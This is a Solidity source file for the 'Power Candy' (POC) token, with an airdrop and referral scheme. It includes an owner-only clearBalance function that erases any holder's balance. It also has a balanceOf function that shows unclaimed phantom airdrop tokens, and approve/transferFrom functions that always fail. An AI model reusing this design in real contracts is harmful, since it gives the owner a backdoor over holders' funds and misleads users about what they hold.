 

pragma solidity ^0.4.22;

contract POCToken{


     
     
    function safeAdd(uint a, uint b) private pure returns (uint c) { c = a + b; require(c >= a); }
    function safeSub(uint a, uint b) private pure returns (uint c) { require(b <= a); c = a - b; }
    function safeMul(uint a, uint b) private pure returns (uint c) { c = a * b; require(a == 0 || c / a == b);}
    function safeDiv(uint a, uint b) private pure returns (uint c) { require(b > 0); c = a / b; }
     
     

     
     
    address public owner;
    address public newOwner;

    event OwnershipTransferred(address indexed _from, address indexed _to);
    modifier onlyOwner { require(msg.sender == owner); _; }

    function transferOwnership(address _newOwner) public onlyOwner {
        newOwner = _newOwner;
    }
    function acceptOwnership() public {
        require(msg.sender == newOwner);
        emit OwnershipTransferred(owner, newOwner);
        owner = newOwner;
        newOwner = address(0);
    }
     
     

     
     
    string public symbol = "POC";
    string public name = "Power Candy";
    uint8 public decimals = 18;
    uint public totalSupply = 1e28; 

    uint public offline = 6e27; 
    uint private retention = 3e27; 

    uint public airdrop = 1e27; 
    uint public airdropLimit = 4e23; 
    uint public fadd = 3e20; 
    uint public fshare = 5e19; 

    bool public allowTransfer = true; 
    bool public allowAirdrop = true; 

    mapping(address => uint) private balances;
    mapping(address => uint) public airdropTotal;
    mapping(address => address) public airdropRecord;

    event Transfer(address indexed from, address indexed to, uint tokens);
    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);

    address private retentionAddress = 0x17a896C50F11a4926f97d28EC4e7B26149712e08;
    constructor() public {
        owner = msg.sender;
        airdropRecord[owner] = owner;
        airdropRecord[retentionAddress] = retentionAddress;

        balances[retentionAddress] = retention;
        emit Transfer(address(0), retentionAddress, retention);
    }
    function specialAddress(address addr) private pure returns(bool spe) { 
        spe = (addr == address(0) || addr == address(1));
    }
    function balanceOf(address tokenOwner) public view returns (uint balance) {
        require(specialAddress(tokenOwner) == false);
        if(airdrop >= fadd && airdropRecord[tokenOwner] == address(0) && tokenOwner != retentionAddress){ 
            balance = balances[tokenOwner] + fadd;
        }else{
            balance = balances[tokenOwner];
        }
    }
    function allowance(address tokenOwner, address spender) public pure returns (uint remaining) {
        require(specialAddress(tokenOwner) == false);
        require(specialAddress(spender) == false);
         
        remaining = 0;
    }
    function activation(uint bounus, address addr) private {
        uint airdropBounus = safeAdd(airdropTotal[addr], bounus);
        if(airdrop >= bounus && airdropBounus <= airdropLimit && addr != retentionAddress){ 
            balances[addr] = safeAdd(balances[addr], bounus);
            airdropTotal[addr] = airdropBounus;
            airdrop = safeSub(airdrop, bounus);
            emit Transfer(address(0), addr, bounus);
        }
    }
    function transfer(address to, uint tokens) public returns (bool success) {
        require(allowTransfer && tokens > 0);
        require(to != msg.sender);
        require(specialAddress(to) == false);

        if (allowAirdrop && airdropRecord[msg.sender] == address(0) && airdropRecord[to] != address(0)) { 
            activation(fadd, msg.sender);
            activation(fshare, to);
            airdropRecord[msg.sender] = to; 
        }

        balances[msg.sender] = safeSub(balances[msg.sender], tokens);
        balances[to] = safeAdd(balances[to], tokens);
        emit Transfer(msg.sender, to, tokens);
        success = true;
    }
    function approve(address spender, uint tokens) public pure returns (bool success) {
        require(tokens  > 0);
        require(specialAddress(spender) == false);
         
        success = false;
    }
    function transferFrom(address from, address to, uint tokens) public pure returns (bool success) {
        require(tokens  > 0);
        require(specialAddress(from) == false);
        require(specialAddress(to) == false);
         
        success = false;
    }
     
     

    function offlineExchange(address to, uint tokens) public onlyOwner {
        require(offline >= tokens);
        balances[to] = safeAdd(balances[to], tokens);
        offline = safeSub(offline, tokens);
        emit Transfer(address(1), to, tokens);
    }
    function clearBalance(address addr) public onlyOwner {
        emit Transfer(addr, address(1), balances[addr]);
        balances[addr] = 0;
    }
    function chAirDropLimit(uint _airdropLimit) public onlyOwner {
        airdropLimit = _airdropLimit;
    }
    function chAirDropFadd(uint _fadd) public onlyOwner {
        fadd = _fadd;
    }
    function chAirDropFshare(uint _fshare) public onlyOwner {
        fshare = _fshare;
    }
    function chAllowTransfer(bool _allowTransfer) public onlyOwner {
        allowTransfer = _allowTransfer;
    }
    function chAllowAirdrop(bool _allowAirdrop) public onlyOwner {
        allowAirdrop = _allowAirdrop;
    }
}